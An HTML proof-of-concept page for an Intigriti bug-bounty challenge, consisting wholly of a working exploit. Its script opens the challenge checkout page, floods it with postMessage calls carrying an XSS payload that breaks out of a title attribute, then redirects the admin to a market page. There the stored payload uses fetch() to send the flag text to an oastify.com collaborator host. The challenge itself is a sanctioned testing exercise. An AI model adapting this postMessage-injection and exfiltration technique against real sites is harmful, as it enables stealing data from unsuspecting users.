<!DOCTYPE html>
<html>
<head>
    <title>Intigriti January Challenge PoC</title>
</head>
<body style="background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 50px;">
    <h1>Initiating Heist...</h1>
    <p>Following the trail of coins...</p>

    <script>
        const TARGET_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
        
        // This XSS payload breaks out of the title attribute in marketwatch.html
        // and sends the flag text to your collaborator.
        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?flag=' + document.getElementById('flagText').innerText)">`;

        // 1. Open the checkout page in a new window
        const win = window.open(TARGET_URL);

        // 2. Spam the postMessage every 500ms
        // This ensures we hit the Admin's page the millisecond their wallets load
        let count = 0;
        const spammer = setInterval(() => {
            win.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: XSS, // Inject XSS here
                    currency: '1337COIN',
                    amount: 0.00000001
                }
            }, '*');
            
            count++;
            if (count > 20) clearInterval(spammer);
        }, 500);

        // 3. After the transaction is sent, redirect the Admin to MarketWatch
        // to trigger the stored XSS.
        setTimeout(() => {
            win.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
        }, 8000);
    </script>
</body>
</html>
